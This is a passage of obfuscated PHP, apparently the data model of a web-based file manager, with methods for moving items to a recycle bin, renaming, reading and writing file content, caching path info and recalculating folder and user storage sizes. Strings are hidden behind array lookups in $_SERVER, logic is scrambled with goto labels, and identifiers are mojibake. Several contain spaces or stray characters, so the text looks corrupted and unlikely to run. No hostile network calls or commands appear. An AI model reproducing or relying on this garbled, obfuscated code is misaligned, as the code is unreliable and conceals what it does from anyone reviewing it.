Ó­ë¹Ã´ = $e‰•£‘È”Æ[738]; $D‰„÷Ó÷…¦ = $_SERVER[$e‰•£‘È”Æ[739]] . $e‰•£‘È”Æ[740]; goto cñ‰èîî¸Ò; AÑ„Â²½â¿: } $e«é¤šğéõ = $this->sourceInfo($bì£ìÕ«§µ); $F†‰Ÿ¹¯É = $this->pathInfoMore($bì£ìÕ«§µ); goto B™³äåÊ²–; B™³äåÊ²–: if (!$e«é¤šğéõ) { return !0; } if ($e«é¤šğéõ[$e‰•£‘È”Æ[463]] == 0) { if (!_get($GLOBALS, $e‰•£‘È”Æ[459])) { return !1; } } $this->lockMoveStart($bì£ìÕ«§µ); goto C»‰¿Ÿ÷á†; EµÊÁöñ½ø: $this->lockMoveEnd($bì£ìÕ«§µ); Hook::trigger($e‰•£‘È”Æ[1457], $F†‰Ÿ¹¯É, $aåŸë±óÄ); return !0; goto D‡‡Û¯é­; C»‰¿Ÿ÷á†: Hook::trigger($e‰•£‘È”Æ[2357], $F†‰Ÿ¹¯É, $aåŸë±óÄ); if ($aåŸë±óÄ) { Model($e‰•£‘È”Æ[2356])->moveToRecycle($bì£ìÕ«§µ); } else { $d†ˆ¿Ïò§ô = $this->childrenAll($e«é¤šğéõ); Model($e‰•£‘È”Æ[507])->eventRemove($bì£ìÕ«§µ); $this->removeRelevance($d†ˆ¿Ïò§ô[$e‰•£‘È”Æ[2355]], $d†ˆ¿Ïò§ô[$e‰•£‘È”Æ[1245]]); } $this->folderSizeReset($e«é¤šğéõ[$e‰•£‘È”Æ[463]]); goto AÙ¼¯‡½­¼; D‡‡Û¯é­: } public function childrenAll($B…¨™¹»Ìš) { $fˆÕéĞ–ù =& $_SERVER[í™]; $CÏÄİƒ¡’ = $B…¨™¹»Ìš[$fˆÕéĞ–ù[369]]; if ($B…¨™¹»Ìš[$fˆÕéĞ–ù[370]] == $fˆÕéĞ–ù[83]) { $CÄƒ¸ñ£ğÌ = array($fˆÕéĞ–ù[527] => array($fˆÕéĞ–ù[485], $B…¨™¹»Ìš[$fˆÕéĞ–ù[461]] . $CÏÄİƒ¡’ . $fˆÕéĞ–ù[486])); $E»²¡Ú’† = array($fˆÕéĞ–ù[527] => $CÄƒ¸ñ£ğÌ[$fˆÕéĞ–ù[461]]); $fˆåÒ£ÅÀŒ = $this->field($fˆÕéĞ–ù[2358])->where($E»²¡Ú’†)->select(); $Eª“ˆåÍÖ® = !1; $BÇøÈÒò­Ş = array($CÏÄİƒ¡’); if ($fˆåÒ£ÅÀŒ) { $Eª“ˆåÍÖ® = array_to_keyvalue($fˆåÒ£ÅÀŒ, $fˆÕéĞ–ù[33], $fˆÕéĞ–ù[419]); $Eª“ˆåÍÖ® = array_remove_value($Eª“ˆåÍÖ®, $fˆÕéĞ–ù[470]); $BÇøÈÒò­Ş = array_to_keyvalue($fˆåÒ£ÅÀŒ, $fˆÕéĞ–ù[33], $fˆÕéĞ–ù[369]); $BÇøÈÒò­Ş[] = $CÏÄİƒ¡’; } } else { $Eª“ˆåÍÖ® = array($B…¨™¹»Ìš[$fˆÕéĞ–ù[419]]); $BÇøÈÒò­Ş = array($CÏÄİƒ¡’); } return array($fˆÕéĞ–ù[2355] => $BÇøÈÒò­Ş, $fˆÕéĞ–ù[1245] => $Eª“ˆåÍÖ®); } public function removeArray($AÏ›ÆÜ¡Î¼) { if (!$AÏ›ÆÜ¡Î¼) { return !0; } } public function removeRelevance($F­ŠóÄº™Â, $fõˆ¿ìË) { goto f†¬·˜ˆ¤â; c°°†²³†Ù: $b£ŒÂ¸ï² = array($Cê„Œš¬¨ğ[383] => array($Cê„Œš¬¨ğ[384], $F­ŠóÄº™Â)); Model($Cê„Œš¬¨ğ[2356])->where($b£ŒÂ¸ï²)->delete(); Model($Cê„Œš¬¨ğ[413])->where($b£ŒÂ¸ï²)->delete(); goto eˆÛëğÀì; f†¬·˜ˆ¤â: $Cê„Œš¬¨ğ =& $_SERVER[í™]; $F­ŠóÄº™Â = $F­ŠóÄº™Â ? $F­ŠóÄº™Â : array(); $fõˆ¿ìË = $fõˆ¿ìË ? $fõˆ¿ìË : array(); goto C‡¬’“ö ; eˆÛëğÀì: Model($Cê„Œš¬¨ğ[2359])->where($b£ŒÂ¸ï²)->delete(); Model($Cê„Œš¬¨ğ[507])->where($b£ŒÂ¸ï²)->delete(); Model($Cê„Œš¬¨ğ[2071])->removeBySource($F­ŠóÄº™Â); goto F¤¿’ÇÓ×; C‡¬’“ö : $F­ŠóÄº™Â = array_unique(array_filter($F­ŠóÄº™Â)); $fõˆ¿ìË = array_unique(array_filter($fõˆ¿ìË)); if (!$F­ŠóÄº™Â) { return !1; } goto c°°†²³†Ù; F¤¿’ÇÓ×: Model($Cê„Œš¬¨ğ[2337])->removeBySource($F­ŠóÄº™Â); $this->where($b£ŒÂ¸ï²)->delete(); Model($Cê„Œš¬¨ğ[422])->remove($fõˆ¿ìË); goto fäÌ‡¾Šœ¸; fäÌ‡¾Šœ¸: for ($FÔÅ‚Şö = 0; $FÔÅ‚Şö < count($F­ŠóÄº™Â); $FÔÅ‚Şö++) { $this->sourceCacheClear($F­ŠóÄº™Â[$FÔÅ‚Şö]); } goto Eˆì¨²Î¶ê; Eˆì¨²Î¶ê: } public function rename($CŞÒ„Ô–„, $C‚×‹ª½ê) { goto bï‘ÑÒçˆ; bï‘ÑÒçˆ: $dõ˜±¡‰ŒØ =& $_SERVER[í™]; $cë¥·‹¥Š¤ = $this->sourceInfo($CŞÒ„Ô–„); if (!$cë¥·‹¥Š¤) { return !1; } goto D°ÏÄöˆ¡¸; EÒÕ®ñÄÛå: $b‚ğƒÜøƒ = $dõ˜±¡‰ŒØ[2345] . $cë¥·‹¥Š¤[$dõ˜±¡‰ŒØ[463]]; if (isset(self::$cacheChildList[$b‚ğƒÜøƒ])) { unset(self::$cacheChildList[$b‚ğƒÜøƒ]); } return $F÷Ò‹Ïòó; goto C…àÚÍÅÔ¬; dŒâ·„ˆĞ: if (!$cë¥·‹¥Š¤[$dõ˜±¡‰ŒØ[370]] == $dõ˜±¡‰ŒØ[83]) { $bàÁ‚¢“Úƒ[$dõ˜±¡‰ŒØ[372]] = get_path_ext($C‚×‹ª½ê); } Model($dõ˜±¡‰ŒØ[507])->eventRename($CŞÒ„Ô–„, $cë¥·‹¥Š¤[$dõ˜±¡‰ŒØ[28]], $C‚×‹ª½ê); $this->sourceCacheClear($CŞÒ„Ô–„); goto C–•­àËÇ; D°ÏÄöˆ¡¸: $béğğˆò½¶ = $this->fileNameExist($cë¥·‹¥Š¤[$dõ˜±¡‰ŒØ[463]], $C‚×‹ª½ê); if ($béğğˆò½¶) { return !1; } $bàÁ‚¢“Úƒ = array($dõ˜±¡‰ŒØ[386] => $C‚×‹ª½ê, $dõ˜±¡‰ŒØ[526] => USER_ID); goto dŒâ·„ˆĞ; C–•­àËÇ: $this->setNamePinyin($CŞÒ„Ô–„, $bàÁ‚¢“Úƒ[$dõ˜±¡‰ŒØ[28]], !1); $this->updateModifyTime($cë¥·‹¥Š¤[$dõ˜±¡‰ŒØ[463]]); $F÷Ò‹Ïòó = $this->where(array($dõ˜±¡‰ŒØ[383] => $CŞÒ„Ô–„))->data($bàÁ‚¢“Úƒ)->save(); goto EÒÕ®ñÄÛå; C…àÚÍÅÔ¬: } public function setNamePinyin($e¨‡‰†ø©ô, $Fâ«„ß†¦Í, $EÁ²ç«¾‹ = true) { $ağŠ¦‡Ò×ç =& $_SERVER[í™]; $F‚¹‡ÑÈò† = Input::check($Fâ«„ß†¦Í, $ağŠ¦‡Ò×ç[530]); if ($EÁ²ç«¾‹ && !$F‚¹‡ÑÈò†) { return; } if (!$F‚¹‡ÑÈò†) { $this->metaSet($e¨‡‰†ø©ô, $ağŠ¦‡Ò×ç[416], null); $this->metaSet($e¨‡‰†ø©ô, $ağŠ¦‡Ò×ç[415], null); return; } $DŒÚîæ…İ = array($ağŠ¦‡Ò×ç[416] => str_replace($ağŠ¦‡Ò×ç[50], $ağŠ¦‡Ò×ç[33], Pinyin::encode($Fâ«„ß†¦Í)), $ağŠ¦‡Ò×ç[415] => Pinyin::encode($Fâ«„ß†¦Í, $ağŠ¦‡Ò×ç[531])); $this->metaSet($e¨‡‰†ø©ô, $DŒÚîæ…İ); } public function getContent($a¸¨ôŒÇé) { goto C¾Î¬‹ïï; fÒ„æóÚòÜ: if ($BÉ‰¨­Ó£[$f‚¾ØĞÙ£œ[77]] == 0) { return $f‚¾ØĞÙ£œ[33]; } $BŸäá¹×š = $f‚¾ØĞÙ£œ[2360] . $BÉ‰¨­Ó£[$f‚¾ØĞÙ£œ[163]]; if ($BÉ‰¨­Ó£[$f‚¾ØĞÙ£œ[77]] <= 1024 * 10) { $dÛ–¦£¬ÆÏ = Cache::get($BŸäá¹×š); if (!$dÛ–¦£¬ÆÏ) { $dÛ–¦£¬ÆÏ = IO::getContent($BÉ‰¨­Ó£[$f‚¾ØĞÙ£œ[75]]); Cache::set($BŸäá¹×š, $dÛ–¦£¬ÆÏ); } return $dÛ–¦£¬ÆÏ; } goto Fñ‹³ÀôÑÁ; C¾Î¬‹ïï: $f‚¾ØĞÙ£œ =& $_SERVER[í™]; $BÉ‰¨­Ó£ = $this->fileInfoGet($a¸¨ôŒÇé); if (!$BÉ‰¨­Ó£) { return !1; } goto fÒ„æóÚòÜ; Fñ‹³ÀôÑÁ: return IO::getContent($BÉ‰¨­Ó£[$f‚¾ØĞÙ£œ[75]]); goto FŞà¬ªë“´; FŞà¬ªë“´: } public function setDesc($cœ“ÊôëËÕ, $cîìˆ£ëŒ¨) { $a…Ï‘¡Ã²Ò =& $_SERVER[í™]; Model($a…Ï‘¡Ã²Ò[507])->eventAddDesc($cœ“ÊôëËÕ, $cîìˆ£ëŒ¨); return $this->metaSet($cœ“ÊôëËÕ, $a…Ï‘¡Ã²Ò[405], $cîìˆ£ëŒ¨); } public function setContent($EÏ™¼¶˜Ú¦, $Aßï­ğ“· = '') { goto cè¢‚­ÃŸÂ; cè¢‚­ÃŸÂ: $d§¹ƒ˜®á˜ =& $_SERVER[í™]; $cåé’õÆù = $this->sourceInfo($EÏ™¼¶˜Ú¦); $C„ïƒŸËë = $this->fileInfoGet($EÏ™¼¶˜Ú¦); goto f—‚à×ªáÒ; Bä£™©Úãˆ: if (!$e¦îİµ´íÜ) { return Model($d§¹ƒ˜®á˜[422])->remove($FÓ‹Ä’ŠÑ‘[$d§¹ƒ˜®á˜[419]]); } $this->folderSizeReset($cåé’õÆù[$d§¹ƒ˜®á˜[463]]); return !0; goto B×òŠ‹í®ë; f—‚à×ªáÒ: if (!$C„ïƒŸËë || !$cåé’õÆù) { return !1; } $FÓ‹Ä’ŠÑ‘ = Model($d§¹ƒ˜®á˜[422])->addFileByContent($Aßï­ğ“·, $cåé’õÆù[$d§¹ƒ˜®á˜[28]]); $e¦îİµ´íÜ = $this->fileHistory($cåé’õÆù, $FÓ‹Ä’ŠÑ‘[$d§¹ƒ˜®á˜[419]], $FÓ‹Ä’ŠÑ‘[$d§¹ƒ˜®á˜[77]]); goto Bä£™©Úãˆ; B×òŠ‹í®ë: } public function fileSubstr($aÅá«ÎÊÔ, $d©‘ÅÊ‚Á, $B™¹³á¼ãé) { $eÙî êåš¢ = $this->fileInfoGet($aÅá«ÎÊÔ); if (!$eÙî êåš¢) { return !1; } return IO::fileSubstr($eÙî êåš¢[$_SERVER[í™][75]], $d©‘ÅÊ‚Á, $B™¹³á¼ãé); } public function fileInfoGet($EŠ“„øâÉÀ) { goto a³ãÑé–; a³ãÑé–: $b®˜öÀšùˆ =& $_SERVER[í™]; $F¤ëŒà¦…ˆ = $this->sourceInfo($EŠ“„øâÉÀ); if (!$F¤ëŒà¦…ˆ || $F¤ëŒà¦…ˆ[$b®˜öÀšùˆ[370]]) { return !1; } goto d’¢À½ªœÊ; AÕ¼æ¤Ş»œ: return $B’°®ÊÓÌò; goto cå´Çˆôòß; d’¢À½ªœÊ: $d¥ºˆƒîË = $b®˜öÀšùˆ[425] . $F¤ëŒà¦…ˆ[$b®˜öÀšùˆ[419]]; $B¡öİø…Ò = _get(self::$cacheFileInfo, $d¥ºˆƒîË); if ($B¡öİø…Ò) { return $B¡öİø…Ò; } goto D¼Æ¹É¿è×; D¼Æ¹É¿è×: $B’°®ÊÓÌò = Model($b®˜öÀšùˆ[422])->fileInfo($F¤ëŒà¦…ˆ[$b®˜öÀšùˆ[419]]); if ($B’°®ÊÓÌò) { $B’°®ÊÓÌò[$b®˜öÀšùˆ[28]] = $F¤ëŒà¦…ˆ[$b®˜öÀšùˆ[28]]; } self::$cacheFileInfo[$d¥ºˆƒîË] = $B’°®ÊÓÌò; goto AÕ¼æ¤Ş»œ; cå´Çˆôòß: } private function folderChildrenNumber($béßÅ£ÁØ) { $aÏïôáÄ¥Œ =& $_SERVER[í™]; $Cù­–·í¿Ó = $this->sourceInfo($béßÅ£ÁØ); $cç¯ß˜ÀĞ‡ = array($aÏïôáÄ¥Œ[527] => array($aÏïôáÄ¥Œ[485], $Cù­–·í¿Ó[$aÏïôáÄ¥Œ[461]] . $béßÅ£ÁØ . $aÏïôáÄ¥Œ[486]), $aÏïôáÄ¥Œ[396] => intval($Cù­–·í¿Ó[$aÏïôáÄ¥Œ[397]]), $aÏïôáÄ¥Œ[520] => 1); $BóàóÑ×›Œ = $this->where($cç¯ß˜ÀĞ‡)->count(); $FÛÔÑÁôğÁ = $this->where($cç¯ß˜ÀĞ‡)->where(array($aÏïôáÄ¥Œ[520] => 0))->count(); return array($aÏïôáÄ¥Œ[81] => $FÛÔÑÁôğÁ, $aÏïôáÄ¥Œ[82] => $BóàóÑ×›Œ); } public function pathInfo($C®Œ¡‚¥˜×, $Cœ™¢ÕÄš» = false) { goto E„”†İ†‘¸; D ­‚ñ¥Ù: if (!$e¥¨íÌ¸‡) { return !1; } $e¥¨íÌ¸‡ = $this->_listDataApplyItem($e¥¨íÌ¸‡, $Cœ™¢ÕÄš»); self::$cachePathInfo[$C©¥·ÓÃ²ñ] = $e¥¨íÌ¸‡; goto D„“¡«Š¦; E„”†İ†‘¸: $AÓÜ£‘×‹Ê =& $_SERVER[í™]; $C®Œ¡‚¥˜× = intval($C®Œ¡‚¥˜×); $C©¥·ÓÃ²ñ = $AÓÜ£‘×‹Ê[411] . intval($Cœ™¢ÕÄš») . $AÓÜ£‘×‹Ê[412] . $C®Œ¡‚¥˜×; goto bíÜºÓÓè¼; bíÜºÓÓè¼: $fâŸ¾ˆÛ× = _get(self::$cachePathInfo, $C©¥·ÓÃ²ñ); if ($fâŸ¾ˆÛ×) { return $fâŸ¾ˆÛ×; } $e¥¨íÌ¸‡ = $this->sourceInfo($C®Œ¡‚¥˜×); goto D ­‚ñ¥Ù; D„“¡«Š¦: return $e¥¨íÌ¸‡; goto bÛ³½Ø—Œ‰; bÛ³½Ø—Œ‰: } public static $cachePathInfoMore = array(); public function pathInfoMore($cà¥æÙ¢Ÿİ) { goto e“Êáï‰¢¼; c¶›ˆŞ–Ï„: self::$cachePathInfoMore[$cà¥æÙ¢Ÿİ] = $FÉÁ…–®™ô; return $FÉÁ…–®™ô; goto b»ÓëÖ‡¡â; e“Êáï‰¢¼: $d½ëÉ‘Óîé =& $_SERVER[í™]; $bÒëÁ”Äğ = _get(self::$cachePathInfoMore, $cà¥æÙ¢Ÿİ); if ($bÒëÁ”Äğ) { return $bÒëÁ”Äğ; } goto eŒù‹½»×; eŒù‹½»×: $FÉÁ…–®™ô = $this->pathInfo($cà¥æÙ¢Ÿİ); if (!$FÉÁ…–®™ô) { return !1; } if ($FÉÁ…–®™ô[$d½ëÉ‘Óîé[370]] == $d½ëÉ‘Óîé[83]) { $FÉÁ…–®™ô[$d½ëÉ‘Óîé[80]] = $this->folderChildrenNumber($cà¥æÙ¢Ÿİ); } goto c¶›ˆŞ–Ï„; b»ÓëÖ‡¡â: } public function sourceInfo($FáåŞÁÉªÜ) { goto dò…öƒ¾òË; b‰êÛÅ½´À: $fŞÜĞ‹Ÿ´ = $this->where(array($D’‘¨‹Šá[369] => $FáåŞÁÉªÜ))->find(); self::$cacheSourceInfo[$BîˆºÏ‚‡÷] = $fŞÜĞ‹Ÿ´; return self::$cacheSourceInfo[$BîˆºÏ‚‡÷]; goto C®ó­óå§œ; dò…öƒ¾òË: $D’‘¨‹Šá =& $_SERVER[í™]; if (!$FáåŞÁÉªÜ) { return array(); } $FáåŞÁÉªÜ = intval($FáåŞÁÉªÜ); goto e÷æËÓ‰±„; e÷æËÓ‰±„: $BîˆºÏ‚‡÷ = $D’‘¨‹Šá[410] . $FáåŞÁÉªÜ; $fŸ¹Ç’ß‚ê = _get(self::$cacheSourceInfo, $BîˆºÏ‚‡÷); if ($fŸ¹Ç’ß‚ê) { return $fŸ¹Ç’ß‚ê; } goto b‰êÛÅ½´À; C®ó­óå§œ: } public function sourceCacheClear($C¤ºòÏÔÑ = false) { if ($C¤ºòÏÔÑ == !1) { self::$cacheSourceInfo = null; self::$cacheSourceInfo = array(); return; } unset(self::$cacheSourceInfo[$_SERVER[í™][410] . $C¤ºòÏÔÑ]); } public function pathInfoByPath($BÛ¹Äğ´¯, $fÔÀÚÄ·Ÿ) { $E›‚Ü©äù£ =& $_SERVER[í™]; $d‘Èëµ”—¤ = !$fÔÀÚÄ·Ÿ ? array() : explode($E›‚Ü©äù£[8], trim($fÔÀÚÄ·Ÿ, $E›‚Ü©äù£[8])); $EïËšÈõ¨¡ = $BÛ¹Äğ´¯; foreach ($d‘Èëµ”—¤ as $e¥ÀÊš„àÁ) { $B‘¿ÔßÎğ¬ = array($E›‚Ü©äù£[463] => $EïËšÈõ¨¡, $E›‚Ü©äù£[28] => $e¥ÀÊš„àÁ); $E‚ª®‹ÅŒ = $this->where($B‘¿ÔßÎğ¬)->select(); if (!$E‚ª®‹ÅŒ) { return !1; } $E‚ª®‹ÅŒ = array_sort_by($E‚ª®‹ÅŒ, $E›‚Ü©äù£[397]); $EïËšÈõ¨¡ = $E‚ª®‹ÅŒ[0][$E›‚Ü©äù£[369]]; } return $this->pathInfo($EïËšÈõ¨¡, !0); } protected function updateModifyTime($a®õùœäÁ½) { goto d¥¢ßê«è’; E¹ÑóïœóŠ: $this->where($cÎ“ˆ‰§ª·)->save($CÍ–¨ì¥çé); goto b×âùà§›; EÓ£Õ•éƒË: foreach ($a®õùœäÁ½ as $a¦êŒ÷‚‡ => $EáôÈ¦¬™Õ) { $a®õùœäÁ½[$a¦êŒ÷‚‡] = intval($EáôÈ¦¬™Õ); } $cÎ“ˆ‰§ª· = array($F÷¥è¶´“š[369] => array($F÷¥è¶´“š[7], $a®õùœäÁ½)); $CÍ–¨ì¥çé = array($F÷¥è¶´“š[526] => USER_ID, $F÷¥è¶´“š[390] => time()); goto E¹ÑóïœóŠ; d¥¢ßê«è’: $F÷¥è¶´“š =& $_SERVER[í™]; if (!$a®õùœäÁ½) { return; } if (!is_array($a®õùœäÁ½)) { $a®õùœäÁ½ = array($a®õùœäÁ½); } goto EÓ£Õ•éƒË; b×âùà§›: } public function folderSizeReset($d²×–ù”ê) { goto DÏƒçÁ½ù‰; c÷Û»Œçª: $dÖŠœğƒö = array($CÜÕÕÚ­´Î[368] => $d²×–ù”ê, $CÜÕÕÚ­´Î[396] => 0); $aŸÉÇ±ïµô = $this->where($dÖŠœğƒö)->sum($CÜÕÕÚ­´Î[77]); $aŸÉÇ±ïµô = intval($aŸÉÇ±ïµô); goto A–êòªÔ÷·; AËƒ¸œ©åó: CacheLock::lock($D¦¿¶«Æ, 20); $this->sourceCacheClear($d²×–ù”ê); $d”¯¤†í¡’ = $this->sourceInfo($d²×–ù”ê); goto c÷Û»Œçª; A–êòªÔ÷·: $DŞˆé—¤Ş® = $aŸÉÇ±ïµô - intval($d”¯¤†í¡’[$CÜÕÕÚ­´Î[77]]); if ($DŞˆé—¤Ş® == 0) { return CacheLock::unlock($D¦¿¶«Æ); } $this->where(array($CÜÕÕÚ­´Î[383] => $d²×–ù”ê))->setField($CÜÕÕÚ­´Î[77], $aŸÉÇ±ïµô); goto D­Ó¨¥Ø; DÏƒçÁ½ù‰: $CÜÕÕÚ­´Î =& $_SERVER[í™]; if ($this->statusIgnoreResetSpace) { return; } $D¦¿¶«Æ = $CÜÕÕÚ­´Î[2361] . $d²×–ù”ê; goto AËƒ¸œ©åó; D­Ó¨¥Ø: $cİ ›„İÖ = $this->parentLevelArray($d”¯¤†í¡’[$CÜÕÕÚ­´Î[461]]); if ($cİ ›„İÖ) { $dÖŠœğƒö = array($CÜÕÕÚ­´Î[369] => array($CÜÕÕÚ­´Î[384], $cİ ›„İÖ)); if ($DŞˆé—¤Ş® < 0) { $dÖŠœğƒö[$CÜÕÕÚ­´Î[77]] = array($CÜÕÕÚ­´Î[914], abs($DŞˆé—¤Ş®)); } $this->where($dÖŠœğƒö)->setAdd($CÜÕÕÚ­´Î[77], $DŞˆé—¤Ş®); } $this->targetSpaceUpdate($d”¯¤†í¡’[$CÜÕÕÚ­´Î[371]], $d”¯¤†í¡’[$CÜÕÕÚ­´Î[458]]); goto f‰Ù ëÍïê; f‰Ù ëÍïê: CacheLock::unlock($D¦¿¶«Æ); goto d±©«¯àÛ´; d±©«¯àÛ´: } public function folderSizeResetChildren($Añ•“ÄÔ„ô) { goto d³Ş±µÄ¾™; DˆØ‹‚é¸: foreach ($dÏ‹îÚ¯ÄÊ as $BÁ‡ˆ¼šíˆ) { $D³ìƒåÅ — = $BÁ‡ˆ¼šíˆ[$Añ‚‡óÁÅ[463]] . $Añ‚‡óÁÅ[33]; if (!isset($F…á•å¿Ş¬[$D³ìƒåÅ —])) { continue; } if ($BÁ‡ˆ¼šíˆ[$Añ‚‡óÁÅ[397]] == $F…á•å¿Ş¬[$D³ìƒåÅ —][$Añ‚‡óÁÅ[397]]) { $F…á•å¿Ş¬[$D³ìƒåÅ —][$Añ‚‡óÁÅ[77]] += $BÁ‡ˆ¼šíˆ[$Añ‚‡óÁÅ[77]]; } } foreach ($F…á•å¿Ş¬ as $BÁ‡ˆ¼šíˆ) { $Cöô²İÅš· = $this->parentLevelArray($BÁ‡ˆ¼šíˆ[$Añ‚‡óÁÅ[461]]); foreach ($Cöô²İÅš· as $D³ìƒåÅ —) { $D³ìƒåÅ — = $D³ìƒåÅ — . $Añ‚‡óÁÅ[33]; if (!isset($F…á•å¿Ş¬[$D³ìƒåÅ —])) { continue; } if ($BÁ‡ˆ¼šíˆ[$Añ‚‡óÁÅ[397]] == $F…á•å¿Ş¬[$D³ìƒåÅ —][$Añ‚‡óÁÅ[397]]) { $F…á•å¿Ş¬[$D³ìƒåÅ —][$Añ‚‡óÁÅ[77]] += $BÁ‡ˆ¼šíˆ[$Añ‚‡óÁÅ[77]]; } } } $eèã£¢Ö¹İ = array(); goto C³ĞÂÏˆ‚; d³Ş±µÄ¾™: $Añ‚‡óÁÅ =& $_SERVER[í™]; $this->sourceCacheClear($Añ•“ÄÔ„ô); $FšŸÅ„–¹ = $this->sourceInfo($Añ•“ÄÔ„ô); goto bÃ›Šğ…º; cÓ§„®È–÷: $D‚ƒ‘Èâ·[$Añ‚‡óÁÅ[370]] = 0; $dÏ‹îÚ¯ÄÊ = $this->field($e®¬š¯†š)->where($D‚ƒ‘Èâ·)->select(); if (!$dÏ‹îÚ¯ÄÊ) { return; } goto dŞ‚®¨¼‰Ğ; dŞ‚®¨¼‰Ğ: $F…á•å¿Ş¬[] = $FšŸÅ„–¹; $F…á•å¿Ş¬ = array_to_keyvalue($F…á•å¿Ş¬, $Añ‚‡óÁÅ[369]); foreach ($F…á•å¿Ş¬ as $bÑò©äñÒ† => $BÁ‡ˆ¼šíˆ) { $F…á•å¿Ş¬[$bÑò©äñÒ†][$Añ‚‡óÁÅ[2363]] = $F…á•å¿Ş¬[$bÑò©äñÒ†][$Añ‚‡óÁÅ[77]]; $F…á•å¿Ş¬[$bÑò©äñÒ†][$Añ‚‡óÁÅ[77]] = 0; } goto DˆØ‹‚é¸; bÃ›Šğ…º: $D‚ƒ‘Èâ· = array($Añ‚‡óÁÅ[520] => 1, $Añ‚‡óÁÅ[527] => array($Añ‚‡óÁÅ[485], $FšŸÅ„–¹[$Añ‚‡óÁÅ[461]] . $Añ•“ÄÔ„ô . $Añ‚‡óÁÅ[486])); $e®¬š¯†š = $Añ‚‡óÁÅ[2362]; $F…á•å¿Ş¬ = $this->field($e®¬š¯†š)->where($D‚ƒ‘Èâ·)->select(); goto cÓ§„®È–÷; C³ĞÂÏˆ‚: foreach ($F…á•å¿Ş¬ as $BÁ‡ˆ¼šíˆ) { if ($BÁ‡ˆ¼šíˆ[$Añ‚‡óÁÅ[77]] == $BÁ‡ˆ¼šíˆ[$Añ‚‡óÁÅ[2363]]) { continue; } $eèã£¢Ö¹İ[] = array($Añ‚‡óÁÅ[369], $BÁ‡ˆ¼šíˆ[$Añ‚‡óÁÅ[369]], $Añ‚‡óÁÅ[77], $BÁ‡ˆ¼šíˆ[$Añ‚‡óÁÅ[77]]); } $this->saveAll($eèã£¢Ö¹İ); goto C‘µáƒƒÖ¦; C‘µáƒƒÖ¦: } public function userSpaceReset($e¡àÜ·šÂí = false) { $e†¯…¢Ì‹ =& $_SERVER[í™]; $E§“¨åĞœä = $this->where(array($e†¯…¢Ì‹[371] => self::TYPE_USER, $e†¯…¢Ì‹[458] => $e¡àÜ·šÂí, $e†¯…¢Ì‹[370] => 0))->sum($e†¯…¢Ì‹[77]); Model($e†¯…¢Ì‹[476])->userEdit($e¡àÜ·šÂí, array($e†¯…¢Ì‹[2080] => $E§“¨åĞœä)); } public function targetSpaceUpdate($CİÜ±¶à·Å, $dß­Àæœ¸) { $f¦£ğ·Œ÷® =& $_SERVER[í™]; if (!$dß­Àæœ¸) { return; } if (!in_array($CİÜ±¶à·Å, array(self::TYPE_USER, self::TYPE_GROUP))) { return; } $dÑ¿Èßê†é = $this->targetSpaceSize($CİÜ±¶à·Å, $dß­Àæœ¸); if ($CİÜ±¶à·Å == self::TYPE_USER) { Model($f¦£ğ·Œ÷®[476])->userEdit($dß­Àæœ¸, array($f¦£ğ·Œ÷®[2080] => $dÑ¿Èßê†é)); } else { if ($CİÜ±¶à·Å == self::TYPE_GROUP) { Model($f¦£ğ·Œ÷®[460])->groupEdit($dß­Àæœ¸, array($f¦£ğ·Œ÷®[2080] => $dÑ¿Èßê†é)); } } } public function targetSpaceSize($cöÍä°—œ, $c‹¡¯……Ë) { goto a¸—¤¸Ç±‡; c”¥Òç‡: return $D‘»Ğáç½«; goto bÜö¶ä“¿; a¸—¤¸Ç±‡: $E¤æ„ƒæ² =& $_SERVER[í™]; $b‘“´Ş†ç = $this->sourceRoot($cöÍä°—œ, $c‹¡¯……Ë, !0); if (!$b‘“´Ş†ç) { return 0; } goto F£‘Óªéäô; B°«¬öé÷Ç: $cÊ»íÛœøÊ = array_to_keyvalue($cÊ»íÛœøÊ, $E¤æ„ƒæ²[33], $E¤æ„ƒæ²[369]); $cÊ»íÛœøÊ = array_unique(array_filter($cÊ»íÛœøÊ)); if ($cÊ»íÛœøÊ) { $F¥Şäì•¡ = array($E¤æ„ƒæ²[383] => array($E¤æ„ƒæ²[384], $cÊ»íÛœøÊ)); $D‘»Ğáç½« += floatval($this->where($F¥Şäì•¡)->sum($E¤æ„ƒæ²[77])); } goto c”¥Òç‡; F£‘Óªéäô: $D‘»Ğáç½« = floatval($b‘“´Ş†ç[$E¤æ„ƒæ²[77]]); $F¥Şäì•¡ = array($E¤æ„ƒæ²[527] => array($E¤æ„ƒæ²[485], $E¤æ„ƒæ²[472] . $b‘“´Ş†ç[$E¤æ„ƒæ²[369]] . $E¤æ„ƒæ²[486])); $cÊ»íÛœøÊ = Model($E¤æ„ƒæ²[395])->field($E¤æ„ƒæ²[383])->where($F¥Şäì•¡)->select(); goto B°«¬öé÷Ç; bÜö¶ä“¿: } public function allFileTypeProfile() { return $this->fileTypeProfile(!1, !1); } public function userFileTypeProfile($cÒå‘†”×…) { return $this->fileTypeProfile($cÒå‘†”×…, SourceModel::TYPE_USER); } public function groupFileTypeProfile($bÆÆÌ£Ø¹É) { return $this->fileTypeProfile($bÆÆÌ£Ø¹É, SourceModel::TYPE_GROUP); } private function fileTypeProfile($A™Öİµ­²ô, $CàËï‡µ¥ó) { goto D¼ªŞ ÒË©; D¼ªŞ ÒË©: $EÆÀÆÜ±« =& $_SERVER[í™]; $a°è¿ÎŸ™Ç = $EÆÀÆÜ±«[2364] . $A™Öİµ­²ô . $EÆÀÆÜ±«[70] . $CàËï‡µ¥ó; $e×„§¾¶è› = Cache::get($a°è¿ÎŸ™Ç); goto CáŞÖ»¸Ñç; D áÛÇî†: $c˜Ë¥¼“”õ = array(); $c˜Ë¥¼“”õ[$EÆÀÆÜ±«[2365]] = array($EÆÀÆÜ±«[2366] => LNG($EÆÀÆÜ±«[2365]), $EÆÀÆÜ±«[2367] => $this->where($EóšÎö‹ø¯)->count(), $EÆÀÆÜ±«[522] => $this->where($EóšÎö‹ø¯)->sum($EÆÀÆÜ±«[77])); $f…ÜÏ˜Ó¾à = KodIO::fileTypeList(); goto f÷‹ŸëÍ¦; CáŞÖ»¸Ñç: if ($e×„§¾¶è›) { return $e×„§¾¶è›; } $EóšÎö‹ø¯ = array($EÆÀÆÜ±«[520] => 0); if ($A™Öİµ­²ô != !1) { $EóšÎö‹ø¯[$EÆÀÆÜ±«[458]] = $A™Öİµ­²ô; $EóšÎö‹ø¯[$EÆÀÆÜ±«[371]] = $CàËï‡µ¥ó; } goto D áÛÇî†; f÷‹ŸëÍ¦: foreach ($f…ÜÏ˜Ó¾à as $Dœ¥áÅò–œ => $CŒáÓÄß¬¹) { 